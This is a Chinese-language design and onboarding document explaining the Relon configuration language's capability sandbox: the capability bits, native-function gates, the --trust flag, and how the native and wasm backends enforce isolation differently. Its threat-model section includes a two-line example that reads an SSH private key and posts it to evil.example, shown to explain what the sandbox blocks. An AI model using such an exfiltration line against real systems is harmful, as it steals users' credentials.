# Relon 的 trust / capability 模型 —— 给刚接触 Relon 的工程师

> 读完你应能回答:Relon 运行一段不可信的配置程序时,凭什么它不能偷偷读你的私钥文件 /
> 发网络请求?`--trust` 到底放开了什么?为什么 wasm 后端和其它后端的"信任"是两套东西?

---

## 0. 一句话 TL;DR

Relon **默认在沙箱里跑**你的程序:任何有副作用的操作(读写文件、网络、时钟、环境变量、随机数)
都要程序**显式声明需要某个 capability**,而宿主**默认一个都不授**。`--trust` = 把这些 capability
一次性全授(并放开 `#import` 的文件/远程解析)。

但"沙箱"有**两种强度**,这正是 native 后端与 wasm 后端的根本差异:
- **native 后端(tree-walk / bytecode / cranelift)**:沙箱是一道**软件策略门** —— 程序其实跑在宿主
  进程里、手握完整权限,门只是在调用有副作用的函数**之前**查一下"准不准"。门有 bug 或被绕过 → 逃逸。
- **wasm 后端**:沙箱是 **VM 硬隔离** —— 程序是个 WebAssembly 模块,**结构上**就没有任何 ambient
  权限,只能调用宿主明确递给它的 import。逃不出去,跟程序有没有 bug 无关。

---

## 1. 为什么需要它(威胁模型)

Relon 是一门**可编程的配置语言**。配置文件常常来自别处(团队成员、依赖、远程 `#import`)。
"求值一份配置"听起来人畜无害,但一门有副作用能力的语言里,一份配置可以:

```
secret: read_file("/home/you/.ssh/id_rsa")     # 读你的私钥
exfil:  http_post("https://evil.example", secret)  # 发出去
```

所以 Relon 把"有副作用的能力"做成**显式、可授予/可拒绝**的东西。默认**零信任**:上面这段在没有
授权时,`read_file` 会被拒(`CapabilityDenied`),配置求值直接失败。

---

## 2. 核心词汇(先建心智模型)

源码在 `crates/relon-eval-api/src/{context.rs, capability.rs}`。四个概念:

1. **CapabilityBit** —— 6 个能力位(`context.rs` 的 `enum CapabilityBit`):
   `ReadsFs`(读文件)、`WritesFs`(写文件)、`Network`(网络)、`ReadsClock`(读时钟)、
   `ReadsEnv`(读环境变量)、`UsesRng`(随机数)。这是"副作用"的分类法。

2. **native function**(原生函数)—— 真正去做副作用的宿主函数(比如 `read_file`)。Relon 程序
   不能直接 syscall;它只能调用宿主**注册**进来的 native fn。

3. **NativeFnGate** —— 一个 native fn **声明自己需要哪些 bit**(`read_file` 声明 `reads_fs`)。
   它是"这个函数要用什么权限"的标签,挂在每个注册的 native fn 上。

4. **Capabilities** —— 宿主**实际授予**了哪些 bit。`Capabilities::default()` = 全 0(零信任),
   `Capabilities::all_granted()` = 全开。`--trust` 就是把它从 `default()` 翻成 `all_granted()`。

> 记法:**Gate = 函数要什么;Capabilities = 宿主给什么。** 判定就是把两者一比。

---

## 3. 一次检查怎么流动

统一的判定接口是 `CapabilityGate` trait(`capability.rs`):

```rust
trait CapabilityGate {
    fn check(&self, cap: CapabilityBit) -> Result<(), CapabilityError>;
    // “这个 native fn 准不准 dispatch” —— 逐个查它 gate 上声明的 bit,缺一个就拒
    fn check_gate(&self, gate: &NativeFnGate) -> Result<(), CapabilityError> { ... }
}
```

流程(以 `read_file` 为例):

```
程序调用 read_file
  → read_file 的 NativeFnGate { reads_fs: true }
  → CapabilityGate::check_gate(gate)
      → check(ReadsFs)?           // 宿主授了 ReadsFs 吗?
  → 授了 → 调用真正的 read_file;没授 → Err(CapabilityDenied{ ReadsFs })
```

`Capabilities` 自己实现了 `CapabilityGate`(它的 `check` 就是查那一位是否置位)。**核心问题永远是
同一个:"宿主授予的 bit,覆盖得了这个 native fn 声明要的所有 bit 吗?"**

---

## 4. 两种执行哲学(全文最重要的一节)

同样是"沙箱",native 后端和 wasm 后端是**两套机制**:

### A. native 后端 —— 软件策略门(policy gate)
程序最终以**原生机器码 / 解释器**的形式跑在**宿主进程内**,**手握完整 ambient 权限**(它本就能
调任何 syscall)。capability 检查是在调用 guarded native fn **之前**插的一道软件判断。
- 性质:**策略,不是隔离**。门放行 = 真去做;门是"要不要做"的决定,不是"能不能做"的边界。
- 风险:门有 bug、或某条 native 路径没经过门,就能逃逸。**你信任的是实现的正确性。**

### B. wasm 后端 —— VM 硬隔离(containment)
程序被编译成 **WebAssembly 模块**,跑在 wasmtime 里。wasm 模块**零 ambient 权限**:它做不了
syscall、碰不到进程内存以外的任何东西,**唯一**能做的有副作用的事就是调用宿主通过 `Linker` 注入的
**import 函数**。
- 性质:**object-capability** —— "你能做什么" 完全等于 "宿主 wire 了哪些 import 给你"。
- 风险:几乎没有 —— 就算 wasm 程序本身有 bug / 是恶意的,它也**逾越不出 VM 边界**(内存安全 +
  无 ambient syscall,由 wasm 规范 + wasmtime 保证)。**你信任的是 VM,而不是程序。**

> 一句话:native 是"信任实现 + 调用前放行";wasm 是"宿主只暴露想给的门 + VM 强制不可逾越"。

---

## 5. native 三个后端:同一套策略,三种执行时机

策略(§3)是共享的,但每个后端在**什么时候**查、查不过怎么 trap,各不相同:

| 后端 | 检查时机 | 机制 | 拒绝时 |
|---|---|---|---|
| **tree-walk**(解释器) | **dispatch 时** | `ctx.capabilities` 直接 `check_gate` | `RuntimeError::CapabilityDenied` |
| **bytecode**(M2 VM) | **dispatch 时** | `with_capability_gate(gate)` 注入,执行 `CheckCap`/`CallNative` 前查 | `WasmCapabilityDenied` |
| **cranelift**(native AOT/JIT) | **vtable 构建时 + 运行时** | 每次调用构建一张 `CapabilityVtable`(`cap_bit → HostFnPtr`);授予 = 装入函数指针,拒绝 = **留 null slot**。lower 出来的机器码在每个 guarded 调用前做 `cap_lookup` + null-check | null slot → `TrapKind::CapabilityDenied` |

> 策略与 error 形状如今都已统一:`capability.rs` 的 `CapabilityGate` 把决策收敛成"宿主授了这个 bit 吗"
> 一个问题(`check` 直接返回 `Result<(), CapabilityBit>`,不再有 `CapabilityError` / `DenyReason` 两层),
> 三个后端都收敛到同一个 `RuntimeError::CapabilityDenied { cap_bit: Option<u32>, reason, range }`
> ——tree-walk 填人类可读 `reason`(并带上 bit),编译后端只带数值 `cap_bit`。各后端只**消费**这套策略、
> 各自保留 enforcement timing。(历史上这里是 `CapabilityDenied` + `WasmCapabilityDenied` 两个 error 形状
> 加两处审计点,已合并。)

`cranelift` 的关键细节:它不是"调用前查一个 bool",而是把"授予"**物化**成 vtable 里有没有那个函数
指针 —— 没授就是个 null,机器码 load 到 null 就 trap。所以**授予一个 capability ≡ 注册一个 host fn**。
这一点下面 §7 会埋一个坑。

---

## 6. `--trust` 到底放开了什么(它管两件事)

CLI 的 `--trust`(`crates/relon-cli/src/main.rs`)其实拨动**两个**开关,别只记住一个:

1. **运行时 capability 姿态**:`Capabilities::default()`(零信任)→ `all_granted()`(全开)。
   —— 影响 §5 的 native-fn 门。
2. **模块 resolver 信任**:`ResolverChainLoader::sandboxed()` → `trusted()`,外加 `--trust` 才放开
   `#import "https://..."` 远程导入和逃逸出 entry 目录的文件导入。—— 影响**加载/分析阶段**,
   在选后端**之前**就生效。

> 所以"我传了 `--trust`"在不同语境下含义不同:可能是为了 native fn 的副作用,也可能只是为了
> `#import` 能拉文件/远程。文档化授权姿态,是为了让 code reviewer 一眼看出"这次信任了什么"。

---

## 7. wasm 后端:object-capability + 当前进度(诚实版)

源码:`crates/relon-codegen-wasm`(把 Relon 程序 lower 成 wasm)+ `crates/relon-wasm-evaluator`
(用 wasmtime 跑)。

- 宿主通过 `Linker::func_wrap` 注入一组 `__relon_*` host import(arena 分配、dict/list/str/closure
  运行时 helper)。wasm 模块**只能**调这些 —— 这就是它的全部能力面。**没有 FS/网络 import 存在**,
  所以一个 Relon-到-wasm 的程序**物理上**碰不到文件系统/网络。
- capability / native 的接口是两个 import:`__relon_check_cap(cap)` 和 `__relon_call_native(f, a)`
  (`host_imports.rs` §4.6)。设计上,沙箱策略就落在这两个宿主函数里 —— 宿主决定放不放行。
- **当前是 stub(Z.1/Z.3 follow-up)**:`__relon_check_cap` 只放行 `-1`(无需 cap 哨兵),任何真实
  cap 直接报 "no policy installed";`__relon_call_native` 一律 trap。也就是说 **wasm 后端现在是
  全封闭沙箱,还没有可配置的 trust** —— 没有 `--trust` 等价物,因为还没有任何东西可授权。

> 注意:即便将来 Z.3 把 cap/native 接起来,wasm 的强度依旧来自"宿主只 wire 想给的 import + VM
> 不可逾越",而不是 native 那种"调用前软件放行"。模型不同,不是同一套东西做两遍。

---

## 8. 并排对比

| 维度 | native(`--trust` / 软件门) | wasm 后端 |
|---|---|---|
| 能力的本质 | 调用前的**软件检查**(check-then-call) | **linker wire 了哪些 import**(object-capability) |
| 隔离强度 | 策略,非隔离;ambient 权限,门可被 bug/绕过逃逸 | **VM 硬沙箱**,结构性 escape-proof,零 ambient |
| 默认姿态 | 零信任;`--trust` 翻成 all_granted | 全拒(stub trap) |
| "授予"= | 置 capability bit / 装 vtable 函数指针 | 在 linker 里 wire 那个 import |
| 检查点 | dispatch(tree-walk/bytecode)/ vtable+null-check(cranelift) | host-import 边界(`__relon_check_cap`/`__relon_call_native`) |
| 你信任的是 | **实现的正确性** | **VM 边界**(不信任程序本身) |
| 现状 | tree-walk / bytecode 真生效;cranelift 见 §9 | cap/native 仍是 stub,待 Z.3 |

---

## 9. 现状与坑(上手前必须知道)

- **bytecode**:`--trust` 真生效(经 `with_capability_gate`)。
- **tree-walk**:`--trust` 真生效(`ctx.capabilities = all_granted()` + 信任 resolver)。
- **cranelift**:`--trust` 在 CLI 里**实际是 no-op**。原因(§5 埋的坑):cranelift 靠"授予 ≡ 注册
  host fn"来 gate,而 **CLI 没有 host-fn registry**,而且 CLI 路由到 cranelift 的标量 `#main` lower
  后**没有 native 调用可 gate**;同时 cranelift 是单文件编译、不 stitch `#import`。所以 `--trust` 既
  不授能力也不开导入。**为了不让这个 flag 静默失效误导用户,CLI 现在会显式警告**
  (`relon-cli` 的 `TRUST_UNSUPPORTED_ON_AOT`)。真正让 cranelift honor `--trust` 需要先有
  host-fn registry + gate-driven vtable builder —— 留待真实 native-fn 需求驱动。
- **wasm**:capability/native 是 stub(§7),还没有 trust 旋钮。

### 9.1 已剪掉的尾巴(等价精简,零行为变化)

- **死的 wasm-AOT 能力位图**:`Capabilities::to_cap_bitmap()` + `CapabilityBit::mask()` 已删除——
  全工作区只有单测在用,生产无消费者。它们服务的是 **v5-β-2 stage 4 退役的 wasm-AOT 后端**
  (那条路用一个 `relon_caps_avail` u64 全局做 bit-test);现存的两条真实路径根本不用它:cranelift 走
  vtable + `cap_lookup`,wasmtime 走 `__relon_check_cap` import。残留的 `relon_caps_avail` 误导注释
  (context.rs / ir.rs / lowering.rs / cranelift)已校正。
- **错误形状二合一**:`RuntimeError::WasmCapabilityDenied` 已并入 `CapabilityDenied`(见 §5)。注意
  那个 `Wasm` 前缀本就名不副实——它由 cranelift + bytecode 产出,而非 wasm。
- **能力策略降维**:`DenyReason`(`TrustLevelInsufficient` / `Sandbox` / `Other` 三个变体生产从不构造)
  与 `CapabilityError` 包装层已删,`CapabilityGate::check` 直接 `Result<(), CapabilityBit>`;人类可读
  文案收敛到 `CapabilityBit::deny_message()`。
- **整族 `Wasm*` trap surface 清掉**:`error.rs` 那个 "Wasm-AOT trap surface" 块整块退役。其中 **7 个
  零产出的死变体**(`WasmOutBufTooSmall` / `WasmInBufTooSmall` / `WasmValueTooLarge` / `WasmEmptyList`
  / `WasmInvalidUtf8` / `WasmScratchOOM` / `WasmTrapUnclassified`)直接删;**2 个 live 但名不副实的**
  (`WasmIndexOutOfBounds` / `WasmStepLimitExceeded`,实由 cranelift + bytecode 而非 wasm 产出)并入各自
  的 tree-walk 孪生体 `IndexOutOfBounds` / `StepLimitExceeded`——后者 `limit` 改 `Option<u64>`(编译后端
  trap 无 limit 时为 `None`)。至此 `RuntimeError` 上**不再有 `Wasm` 前缀的变体**:trap 出口按语义命名,
  与产出它的后端解耦。

### 9.2 已接上:source→IR 的 native-call producer(本轮闭环)

之前这里记录的尾巴是「`Op::CheckCap` / `Op::CallNative` 没有 源码→IR 的 producer」。**该 gap 已闭合**。

- **lowering producer(后端无关)**:`relon-ir/lowering.rs` 的自由调用路径在 stdlib 查不到名字后,转去
  查 analyzer 附在 `AnalyzedTree` 上的 `host_fn_signatures` + `host_fn_gates`(`NativeImportBuilder`
  按模块共享,贯穿 entry / schema-method / lambda 三种 body)。命中即:① 按 gate 的每个 required bit
  发一条 `Op::CheckCap { cap_bit }`(在求值实参之前,确保 deny 在 host fn 观察到任何状态前 trap);
  ② intern 一个 `NativeImport` 进 `Module::imports`;③ 发 `Op::CallNative { import_idx, …,
  cap_bit: NO_CAPABILITY_BIT }`——cap 守卫由 CheckCap 前导独立承担,call 本身带 sentinel,故多-bit gate
  无需单字段编码。多-bit gate = 多条 CheckCap;名字与 stdlib 冲突时 stdlib 优先。
- **静态门(单文件入口补齐)**:`capability_check` 原先只在 workspace build 跑(`run`),而编译后端走单文件
  `analyze_with_options`,导致静态 reachability 检查在编译路径被旁路。新增 `run_single` + `AnalyzeOptions
  ::standalone_capability_check`(workspace 不置,编译后端强制置位),于是「gated 调用但没授权」在 **build
  期**即报 `CapabilityRequired`(Error),根本到不了 lowering。
- **bytecode 端到端 = 全通**:`BytecodeEvaluator::from_source_with_options` + `with_host_fns`(按
  `import_idx` 注册 `Arc<dyn RelonFunction>`)+ `with_granted_cap`。grant→dispatch 真跑出 host fn 返回值;
  runtime deny(静态授、运行时姿态更严)→ `CheckCap` 前导 trap `CapabilityDenied` 且 host fn 零调用。
  四条 source 级测试在 `tests/bytecode_sandbox.rs`(`native_call_*`)。
- **cranelift 端到端 = 全通**(本轮新接):`AotEvaluator::from_source_with_options` + `with_host_fns` +
  `with_granted_cap`,API 与 bytecode 对称。两块原先卡 dispatch 的难点都解了:① **命名空间分离**——
  `CapabilityVtable` 现在除了 `cap_bit` 索引的 `slots: Vec<Option<HostFnPtr>>`(CheckCap 的 null-check +
  grant 面),又多一张 `import_idx` 索引的 `host_fns: HashMap<u32, Arc<dyn RelonFunction>>`(CallNative 的
  动态 dispatch),两者互不撞槽,与 bytecode 模型对齐;② **Arc 过 C-ABI**——新增 `relon_call_native`
  host helper(`VtableSlot::RelonCallNative`,COUNT 4→5,`GENERATOR_VERSION` 同步 bump 让旧 object cache
  自失效),codegen 把标量实参 spill 进栈槽,以 `(state, import_idx, args_ptr, arg_count)` 调它;helper
  resolve Arc、打包 `NativeArgs`、调用、把结果按 i64 编回;host-fn 失败/未注册/越界 经 `state.trap_code`
  + 调用点 post-call 检查路由到统一 trap epilogue(不跨 FFI panic)。`grant→dispatch` 真跑出返回值,
  runtime deny 在 host fn 之前 trap。`cap_bit == NO_CAPABILITY_BIT` 走 Arc 路径,具体 `cap_bit` 仍走原
  裸-`HostFnPtr` 直接路径(既有手搓-IR 测试不受影响)。测试见 `tests/native_call_from_source.rs`。
- **§5 那张表现在描述的是「机制就位 **且** 两条编译后端入口均已通」**(bytecode + cranelift 全通)。

### 9.3 还没接上的尾巴(诚实记录)

- 两条编译后端的 `CallNative` dispatch 都还是 **phase-4a 标量信封**:实参只走 i64 lane(打包成
  `Value::Int`),返回值 cranelift 限 `I64`/`Null`、bytecode 多支持 `Bool`/`String`(后者 lift 进 arena)。
  richer 实参类型(Float/String/List)待 buffer-protocol 信封(phase-4b)。
- cranelift 的 **object-cache 路径** 下 host-fn dispatch 仍未接(`from_cache_dir` 的 `native_imports` 为空):
  dlopen 的 ET_DYN 复用 JIT 的 `relon_call_native` 槽没问题,但缓存对象不携带 IR import 表,故缺 name→
  import_idx 映射。JIT 路径(`from_source_with_options`)已全通;缓存路径待真实需求驱动。

---

## 10. 心智模型小结

- 想"我的配置程序能不能读这个文件" → 看两样东西:这个 native fn 的 **gate**(它声明要 `reads_fs`)
  和宿主授予的 **Capabilities**(`--trust` 了吗)。判定 = `check_gate`。
- 想"这个沙箱靠不靠谱" → 看后端:**native = 软件门**(信任实现,策略级);**wasm = VM 硬隔离**
  (信任 VM,容器级)。
- 想"`--trust` 干了啥" → 两件事:开 capability 姿态 + 开 `#import` resolver 信任。
- 想"为什么我 `--trust` 了 cranelift 还是没用" → §9:cranelift 在 CLI 下 moot,会警告你。

源码入口:`crates/relon-eval-api/src/{context.rs, capability.rs}`(模型)、`crates/relon-cli/src/main.rs`
(`--trust` 接线)、各后端 evaluator(enforcement)、`crates/relon-wasm-evaluator/src/host_imports.rs`
(wasm 边界)。
